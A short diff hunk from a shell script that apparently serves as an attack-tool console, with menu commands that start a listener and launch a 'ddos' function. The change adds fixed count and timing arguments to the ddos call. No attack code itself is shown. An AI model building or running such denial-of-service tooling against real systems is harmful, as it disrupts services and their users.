@@ -647,7 +647,7 @@ while true; do
             start_listener "$2"
             ;;
         ddos)
-            ddos "$args"
+            ddos "$args" -n 50 -t 5
             ;;
         exit)
             break
